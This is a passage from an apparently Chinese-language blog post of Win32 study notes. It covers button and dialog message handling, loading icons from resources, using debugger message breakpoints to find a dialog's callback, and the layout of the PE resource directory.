class=\"line\">\twndclass.hbrBackground = (HBRUSH)COLOR_HIGHLIGHTTEXT;</span><br><span class=\"line\">\twndclass.lpfnWndProc = WindowProc;</span><br><span class=\"line\">\twndclass.lpszClassName = className;</span><br><span class=\"line\">\twndclass.hInstance = hInstance;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">//注册 必须给所有的成员赋值调用时</span></span><br><span class=\"line\">\tRegisterClass(&amp;wndclass);</span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tHWND hwnd = CreateWindowEx(</span><br><span class=\"line\">\t\t<span class=\"number\">0</span>,                              <span class=\"comment\">// Optional window styles.</span></span><br><span class=\"line\">\t\tclassName,                     <span class=\"comment\">// Window class</span></span><br><span class=\"line\">\t\tTEXT(<span class=\"string\">&quot;Learn to Program Windows&quot;</span>),    <span class=\"comment\">// Window text</span></span><br><span class=\"line\">\t\tWS_OVERLAPPEDWINDOW,            <span class=\"comment\">// Window style</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">// Size and position</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//相对于父窗口的x y坐标</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//窗口的宽度和高度</span></span><br><span class=\"line\">\t\tCW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>,       <span class=\"comment\">// Parent window    </span></span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>,       <span class=\"comment\">// Menu</span></span><br><span class=\"line\">\t\thInstance,  <span class=\"comment\">// Instance handle</span></span><br><span class=\"line\">\t\t<span class=\"literal\">NULL</span>        <span class=\"comment\">// Additional application data</span></span><br><span class=\"line\">\t\t);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (hwnd == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tCreateButton(hwnd);</span><br><span class=\"line\">\tShowWindow(hwnd, SW_SHOW);</span><br><span class=\"line\"></span><br><span class=\"line\">\tMSG msg;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (GetMessage(&amp;msg, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>) &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        TranslateMessage(&amp;msg);</span><br><span class=\"line\">        DispatchMessage(&amp;msg);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">LRESULT CALLBACK <span class=\"title function_\">WindowProc</span><span class=\"params\">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//OutputDebugStringF(&quot;%X\\n&quot;,uMsg);</span></span><br><span class=\"line\">\tCREATESTRUCT* createst = (CREATESTRUCT*)lParam;</span><br><span class=\"line\">\tDWORD xPos;</span><br><span class=\"line\">\tDWORD yPos;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (uMsg)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> WM_CREATE:</span><br><span class=\"line\">\t\t<span class=\"comment\">//DbgPrintf(&quot;%s\\n&quot;,createst-&gt;lpszClass);</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> WM_MOVE:</span><br><span class=\"line\">\t\txPos = (<span class=\"type\">int</span>)(<span class=\"type\">short</span>)LOWORD(lParam);</span><br><span class=\"line\">\t\tyPos = (<span class=\"type\">int</span>)(<span class=\"type\">short</span>)HIWORD(lParam);</span><br><span class=\"line\">\t\t<span class=\"comment\">//DbgPrintf(&quot;%d %d\\n&quot;,xPos,yPos);</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> WM_SIZE:</span><br><span class=\"line\">\t\t<span class=\"comment\">//DbgPrintf(&quot;%d %d\\n&quot;,wParam,lParam);</span></span><br><span class=\"line\">\t\txPos = (<span class=\"type\">int</span>)(<span class=\"type\">short</span>)LOWORD(lParam);</span><br><span class=\"line\">\t\tyPos = (<span class=\"type\">int</span>)(<span class=\"type\">short</span>)HIWORD(lParam);</span><br><span class=\"line\">\t\t<span class=\"comment\">//DbgPrintf(&quot;%d %d\\n&quot;,xPos,yPos);</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> WM_DESTROY:</span><br><span class=\"line\">        PostQuitMessage(<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> WM_KEYDOWN:</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> WM_LBUTTONDOWN:</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> WM_COMMAND:</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">switch</span> (LOWORD(wParam))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">1001</span>:</span><br><span class=\"line\">\t\t\t\tMessageBox(hwnd, <span class=\"string\">&quot;Hello Button 1&quot;</span>, <span class=\"string\">&quot;Demo&quot;</span>, MB_OK);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">1002</span>:</span><br><span class=\"line\">\t\t\t\tMessageBox(hwnd, <span class=\"string\">&quot;Hello Button 2&quot;</span>, <span class=\"string\">&quot;Demo&quot;</span>, MB_OK);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> <span class=\"number\">1003</span>:</span><br><span class=\"line\">\t\t\t\tMessageBox(hwnd, <span class=\"string\">&quot;Hello Button 3&quot;</span>, <span class=\"string\">&quot;Demo&quot;</span>, MB_OK);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> DefWindowProc(hwnd, uMsg, wParam, lParam);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t<span class=\"comment\">//处理当前程序不关心的消息类型</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> DefWindowProc(hwnd, uMsg, wParam, lParam);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>按钮是一种特殊的窗体，并不需要提供单独的窗口回调函数.</p>\n<p>当按钮有事件产生时，会给父窗口消息处理程序发送一个 WM_COMMAND 消息</p>\n<p>3E9</p>\n<p>3EA</p>\n<h3 id=\"资源文件\"><a class=\"markdownIt-Anchor\" href=\"#资源文件\">#</a> 资源文件</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230331190313883.png\" alt=\"image-20230331190313883\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230331190337635.png\" alt=\"image-20230331190337635\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230331190351737.png\" alt=\"image-20230331190351737\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230331190406647.png\" alt=\"image-20230331190406647\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230331190729027.png\" alt=\"image-20230331190729027\"></p>\n<p>使用 dialog 之后只需要写创建窗口和消息处理函数 DialogBox ()</p>\n<p>对话框处理返回 true，没有处理或者不关心返回 false</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0040112F</span>      <span class=\"number\">90</span>            nop</span><br><span class=\"line\"><span class=\"number\">00401130</span>  /$  <span class=\"number\">8B</span>4424 <span class=\"number\">04</span>     mov     eax,dword ptr ss:[esp+<span class=\"number\">0x4</span>]</span><br><span class=\"line\"><span class=\"number\">00401134</span>  |.  <span class=\"number\">6</span>A <span class=\"number\">00</span>         push    <span class=\"number\">0x0</span>                                          ; /lParam = <span class=\"literal\">NULL</span></span><br><span class=\"line\"><span class=\"number\">00401136</span>  |.  <span class=\"number\">68</span> <span class=\"number\">00104000</span>   push    <span class=\"number\">00401000</span>                                     ; |DlgProc = win32_di<span class=\"number\">.00401000</span></span><br><span class=\"line\"><span class=\"number\">0040113B</span>  |.  <span class=\"number\">6</span>A <span class=\"number\">00</span>         push    <span class=\"number\">0x0</span>                                          ; |hOwner = <span class=\"literal\">NULL</span></span><br><span class=\"line\"><span class=\"number\">0040113</span>D  |.  <span class=\"number\">6</span>A <span class=\"number\">66</span>         push    <span class=\"number\">0x66</span>                                         ; |pTemplate = <span class=\"number\">0x66</span></span><br><span class=\"line\"><span class=\"number\">0040113F</span>  |.  <span class=\"number\">50</span>            push    eax                                          ; |hInst</span><br><span class=\"line\"><span class=\"number\">00401140</span>  |.  A3 F0844000   mov     dword ptr ds:[<span class=\"number\">0x4084F0</span>],eax                  ; |</span><br><span class=\"line\"><span class=\"number\">00401145</span>  |.  FF15 <span class=\"number\">9</span>C504000 call    dword ptr ds:[&lt;&amp;USER32.DialogBoxParamA&gt;]     ; \\DialogBoxParamA</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">DialogBox</span><span class=\"params\">(hInstance,MAKEINTRESOURCE(IDD_DIALOG_MAIN),<span class=\"literal\">NULL</span>,DialogProc)</span>;</span><br><span class=\"line\"><span class=\"comment\">// 回调函数是401000</span></span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n<p>系统的消息处理函数一定会调用我们写的消息处理函数</p>\n<p>消息断点</p>\n<p>LBUTTONUP</p>\n<p>本质上就是条件断点 [esp+8] == LBUTTONUP</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230331195751169.png\" alt=\"image-20230331195751169\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230412203526086.png\" alt=\"image-20230412203526086\"></p>\n<p>在代码段下内存访问断点</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230412203651950.png\" alt=\"image-20230412203651950\"></p>\n<p>继续执行程序</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230412203733682.png\" alt=\"image-20230412203733682\"></p>\n<p>判断是否是对应动作触发的断点</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0018F780   76E662FA  返回到 user32.76E662FA</span><br><span class=\"line\">0018F784   0017031C</span><br><span class=\"line\">0018F788   00000135      # 111 WM_COMMAND 才是对应的消息</span><br></pre></td></tr></table></figure>\n<p>一直往下跟，又回到 7xx</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230412204541268.png\" alt=\"image-20230412204541268\"></p>\n<p>继续执行 F9</p>\n<p>查看此次 MSG 类型</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">BOOL CALLBACK <span class=\"title function_\">DialogProc</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">    HWND hwndDlg,  <span class=\"comment\">// handle to dialog box            </span></span></span><br><span class=\"line\"><span class=\"params\">    UINT uMsg,     <span class=\"comment\">// message            </span></span></span><br><span class=\"line\"><span class=\"params\">    WPARAM wParam, <span class=\"comment\">// first message parameter            </span></span></span><br><span class=\"line\"><span class=\"params\">    LPARAM lParam  <span class=\"comment\">// second message parameter            </span></span></span><br><span class=\"line\"><span class=\"params\">)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tHWND hEditUser = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tHWND hEditPass = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tTCHAR szUserBuff[<span class=\"number\">0x50</span>];</span><br><span class=\"line\">\tTCHAR szUserPass[<span class=\"number\">0x50</span>];</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (uMsg)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span>  WM_INITDIALOG:</span><br><span class=\"line\">        <span class=\"comment\">//MessageBox(NULL, TEXT(&quot;WM_INITDIALOG&quot;), TEXT(&quot;INIT&quot;), MB_OK);</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> TRUE;  <span class=\"comment\">//处理返回true</span></span><br><span class=\"line\">    <span class=\"keyword\">case</span>  WM_COMMAND:</span><br><span class=\"line\">        <span class=\"keyword\">switch</span> (LOWORD(wParam))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span>   IDC_BUTTON_OK:</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//先获取文本框句柄</span></span><br><span class=\"line\">\t\t\thEditUser = GetDlgItem(hwndDlg, IDC_EDIT_USERNAME);</span><br><span class=\"line\">\t\t\thEditPass = GetDlgItem(hwndDlg, IDC_EDIT_PASSWORD);</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//通过句柄得到里面内容</span></span><br><span class=\"line\">\t\t\tGetWindowText(hEditUser, szUserBuff, <span class=\"number\">0x50</span>);</span><br><span class=\"line\">\t\t\tGetWindowText(hEditPass, szUserPass, <span class=\"number\">0x50</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            MessageBox(<span class=\"literal\">NULL</span>, TEXT(<span class=\"string\">&quot;IDC_BUTTON_OK&quot;</span>), TEXT(<span class=\"string\">&quot;OK&quot;</span>), MB_OK);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> TRUE;</span><br><span class=\"line\">        <span class=\"keyword\">case</span>   IDC_BUTTON_ERROR:</span><br><span class=\"line\">            MessageBox(<span class=\"literal\">NULL</span>, TEXT(<span class=\"string\">&quot;IDC_BUTTON_ERROR&quot;</span>), TEXT(<span class=\"string\">&quot;ERROR&quot;</span>), MB_OK);</span><br><span class=\"line\">            EndDialog(hwndDlg, <span class=\"number\">0</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> TRUE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> FALSE;  <span class=\"comment\">//没有处理返回false</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> APIENTRY <span class=\"title function_\">WinMain</span><span class=\"params\">(HINSTANCE hInstance,</span></span><br><span class=\"line\"><span class=\"params\">                     HINSTANCE hPrevInstance,</span></span><br><span class=\"line\"><span class=\"params\">                     LPSTR     lpCmdLine,</span></span><br><span class=\"line\"><span class=\"params\">                     <span class=\"type\">int</span>       nCmdShow)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"> \t<span class=\"comment\">// <span class=\"doctag\">TODO:</span> Place code here.</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tDialogBox(hInstance,MAKEINTRESOURCE(IDD_DIALOG_MAIN),<span class=\"literal\">NULL</span>,DialogProc);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"提取图标\"><a class=\"markdownIt-Anchor\" href=\"#提取图标\">#</a> 提取图标</h3>\n<p>设置 icon</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230413183550422.png\" alt=\"image-20230413183550422\"></p>\n<p>ALT+TAB 大图标</p>\n<p>其他地方的是小图标</p>\n<p>所有资源文件都是 Unicode 的编码</p>\n<p>Windows 程序在处理图标时需要按照分辨率显示图标，所以图标中会有很多相同的大小不一样的</p>\n<p>图标组是描述图标信息的，比如 32*32 16.8 色</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;resource.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">HINSTANCE hAPPInstance;</span><br><span class=\"line\"><span class=\"comment\">//窗口处理函数</span></span><br><span class=\"line\">BOOL CALLBACK <span class=\"title function_\">DialogProc</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">    HWND hwndDlg,  <span class=\"comment\">// handle to dialog box            </span></span></span><br><span class=\"line\"><span class=\"params\">    UINT uMsg,     <span class=\"comment\">// message            </span></span></span><br><span class=\"line\"><span class=\"params\">    WPARAM wParam, <span class=\"comment\">// first message parameter            </span></span></span><br><span class=\"line\"><span class=\"params\">    LPARAM lParam  <span class=\"comment\">// second message parameter            </span></span></span><br><span class=\"line\"><span class=\"params\">)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tHWND hEditUser = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tHWND hEditPass = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tHICON hBigIcon;\t</span><br><span class=\"line\">\tHICON hSmallIcon;\t</span><br><span class=\"line\">\tTCHAR szUserBuff[<span class=\"number\">0x50</span>];</span><br><span class=\"line\">\tTCHAR szUserPass[<span class=\"number\">0x50</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (uMsg)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> WM_INITDIALOG:\t\t\t\t\t\t</span><br><span class=\"line\">\t\thBigIcon = LoadIcon (hAPPInstance, MAKEINTRESOURCE(IDI_ICON_BIG));\t\t</span><br><span class=\"line\">\t\thSmallIcon = LoadIcon (hAPPInstance, MAKEINTRESOURCE(IDI_ICON_SMALL));\t\t</span><br><span class=\"line\">\t\t<span class=\"comment\">//设置图标\t\t</span></span><br><span class=\"line\">\t\tSendMessage(hwndDlg,WM_SETICON,ICON_BIG,(DWORD)hBigIcon);\t\t</span><br><span class=\"line\">\t\tSendMessage(hwndDlg,WM_SETICON,ICON_SMALL,(DWORD)hSmallIcon);\t\t\t\t\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> TRUE;\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">    <span class=\"keyword\">case</span>  WM_COMMAND:</span><br><span class=\"line\">        <span class=\"keyword\">switch</span> (LOWORD(wParam))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span>   IDC_BUTTON_OK:</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//先获取文本框句柄</span></span><br><span class=\"line\">\t\t\thEditUser = GetDlgItem(hwndDlg, IDC_EDIT_USERNAME);</span><br><span class=\"line\">\t\t\thEditPass = GetDlgItem(hwndDlg, IDC_EDIT_PASSWORD);</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//通过句柄得到里面内容</span></span><br><span class=\"line\">\t\t\tGetWindowText(hEditUser, szUserBuff, <span class=\"number\">0x50</span>);</span><br><span class=\"line\">\t\t\tGetWindowText(hEditPass, szUserPass, <span class=\"number\">0x50</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            MessageBox(<span class=\"literal\">NULL</span>, TEXT(<span class=\"string\">&quot;IDC_BUTTON_OK&quot;</span>), TEXT(<span class=\"string\">&quot;OK&quot;</span>), MB_OK);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> TRUE;</span><br><span class=\"line\">        <span class=\"keyword\">case</span>   IDC_BUTTON_ERROR:</span><br><span class=\"line\">            MessageBox(<span class=\"literal\">NULL</span>, TEXT(<span class=\"string\">&quot;IDC_BUTTON_ERROR&quot;</span>), TEXT(<span class=\"string\">&quot;ERROR&quot;</span>), MB_OK);</span><br><span class=\"line\">            EndDialog(hwndDlg, <span class=\"number\">0</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> TRUE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> FALSE;  <span class=\"comment\">//没有处理返回false</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> APIENTRY <span class=\"title function_\">WinMain</span><span class=\"params\">(HINSTANCE hInstance,</span></span><br><span class=\"line\"><span class=\"params\">                     HINSTANCE hPrevInstance,</span></span><br><span class=\"line\"><span class=\"params\">                     LPSTR     lpCmdLine,</span></span><br><span class=\"line\"><span class=\"params\">                     <span class=\"type\">int</span>       nCmdShow)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"> \t<span class=\"comment\">// <span class=\"doctag\">TODO:</span> Place code here.</span></span><br><span class=\"line\"></span><br><span class=\"line\">\thAPPInstance = hInstance;</span><br><span class=\"line\"></span><br><span class=\"line\">\tDialogBox(hInstance,MAKEINTRESOURCE(IDD_DIALOG_MAIN),<span class=\"literal\">NULL</span>,DialogProc);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>LoadPE 解析资源</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230405134430103.png\" alt=\"image-20230405134430103\"></p>\n<p>resource hack 展示资源</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230405134510371.png\" alt=\"image-20230405134510371\"></p>\n<p>可以产生 dmp 文件，直接改 dmp 的后缀不能直接显示</p>\n<p>需要添加对应的头信息，拼成对应的格式</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTczMjU5My9hcnRpY2xlL2RldGFpbHMvMTIyMDIzMTc3P3NwbT0xMDAxLjIxMDEuMzAwMS42NjUwLjEmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy0yfmRlZmF1bHR+Q1RSTElTVH5SYXRlLTEtMTIyMDIzMTc3LWJsb2ctMTE0NDQ0MDU1LjIzNSU1RXYyOSU1RXBjX3JlbGV2YW50X2RlZmF1bHRfYmFzZTMmYW1wO2RlcHRoXzEtdXRtX3NvdXJjZT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLTJ+ZGVmYXVsdH5DVFJMSVNUflJhdGUtMS0xMjIwMjMxNzctYmxvZy0xMTQ0NDQwNTUuMjM1JTVFdjI5JTVFcGNfcmVsZXZhbnRfZGVmYXVsdF9iYXNlMyZhbXA7dXRtX3JlbGV2YW50X2luZGV4PTI=\">PE - 资源表_pe 文件自定义资源_megaparsec 的博客 - CSDN 博客</span></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230413192958983.png\" alt=\"image-20230413192958983\"></p>\n<p>绿的是_IMAGE_RESOURCE_DIRECTORY  资源目录</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NumberOfNamedEntries;\t\t\t\t\t\t<span class=\"comment\">//以名称命名的资源数量\t\t</span></span><br><span class=\"line\">NumberOfIdEntries;      \t\t\t\t\t<span class=\"comment\">//以ID命名的资源数量</span></span><br><span class=\"line\">NumberOfNamedEntries + NumberOfIdEntries = 黄色结构体数量</span><br></pre></td></tr></table></figure>\n<p>黄的是 _IMAGE_RESOURCE_DIRECTORY_ENTRY 资源目录项</p>\n<p>资源目录就是第三个 datadirectory</p>\n<p>所有节点都是绿的 + n 个黄的，绿的来确定下面有多少黄的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span 